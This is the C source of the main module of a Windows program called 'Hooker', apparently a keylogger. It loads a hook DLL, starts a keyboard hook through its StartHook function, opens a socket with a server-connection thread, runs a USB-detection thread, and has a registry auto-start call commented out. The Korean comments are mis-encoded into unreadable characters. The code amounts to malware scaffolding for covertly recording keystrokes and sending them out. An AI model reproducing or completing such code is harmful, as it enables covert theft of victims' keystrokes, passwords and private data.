#include "modules.h"


HINSTANCE g_hInst;
LPCTSTR lpszClass = TEXT("Hooker");
HWND hWndMain;
LPCTSTR FileName = TEXT("C:\\data.txt");
SOCKET hSocket;
SOCKADDR_IN hAddr;
HANDLE hFile;
HANDLE Con_pThread, USB_pThread;
DWORD dwResult;
BOOL isEof = FALSE;

typedef BOOL(*HookProc)();

HINSTANCE KhinstDll;//�ε��� �ν��Ͻ������� dll���� Ű������
HINSTANCE MhinstDll;//���콺��

HookProc Kinstallhook;//Ű����
HookProc Kuninstallhook;

HookProc Minstallhook;//���콺
HookProc Muninstallhook;


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main���Ұ� ������ �޴� ���ڰ� �ٸ��Ƿ� api���α׷��ֽÿ��� WinMain�� ���
	, LPSTR lpszCmdParam, int nCmdShow)
{
	HWND hWnd;
	MSG Message;
	WNDCLASS WndClass;
	WSADATA wsaData;

	g_hInst = hInstance;
	//������ ����
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hInstance = hInstance;
	WndClass.lpfnWndProc = WndProc;
	WndClass.lpszClassName = lpszClass;
	WndClass.lpszMenuName = NULL;
	WndClass.style = CS_HREDRAW | CS_VREDRAW | CS_OWNDC;
	RegisterClass(&WndClass);

	hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL, (HMENU)NULL, hInstance, NULL);

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		MessageBox(hWnd, TEXT("WSAStartUp Failed"), TEXT("Error"), MB_OK);

	//���ϻ���
	CreateSocket();
	//������Ŀ���� ���ӽõ��� ������ ���� ,USB ������ ������ ����
	Con_pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectProc, NULL, 0, 0);
	USB_pThread = (HANDLE)_beginthreadex(NULL, 0, USBDetector, NULL, 0, 0);
	//��������Ʈ�� �ڵ������׸���
	//Register(); 

	
	while (GetMessage(&Message, NULL, 0, 0)) {
		TranslateMessage(&Message);
		DispatchMessage(&Message);
	}

	closesocket(hSocket);
	Kuninstallhook();
	FreeLibrary(KhinstDll);
	TerminateThread(Con_pThread, dwResult);
	TerminateThread(USB_pThread, dwResult);
	CloseHandle(Con_pThread);
	CloseHandle(USB_pThread);
	WSACleanup();
	MessageBox(hWnd, TEXT("����"), TEXT("�˸�"), MB_OK);
	return (int)Message.wParam;

}


LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)//�������� �������� ����� �����ϴ� �Լ� �ռ� peek�޽����κ��� �޽����� ���޹��� �� ó��
{


	switch (iMessage)
	{
	case WM_CREATE:

	    KhinstDll = LoadLibrary(TEXT("DllProject.dll"));

		if (KhinstDll == NULL)
		{
			MessageBox(hWnd, TEXT("dll�ε� ����"), TEXT("����"), MB_OK);
			FreeLibrary(KhinstDll);
			ExitProcess(1);
		}

		Kinstallhook = (HookProc)GetProcAddress(KhinstDll,"StartHook");
		Kuninstallhook = (HookProc)GetProcAddress(KhinstDll,"StopHook");

		if (Kinstallhook == NULL || Kuninstallhook == NULL)
		{

			MessageBox(hWnd, TEXT("�Լ��ε� ����"), TEXT("����"), MB_OK);
			FreeLibrary(KhinstDll);
			ExitProcess(1);
		}
		
		Kinstallhook();
		
		return 0;
		

	case WM_DESTROY:

		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hWnd, iMessage, wParam, IParam);


}



//Ű�ΰ� ��������� �����ڵ����޾ȵ�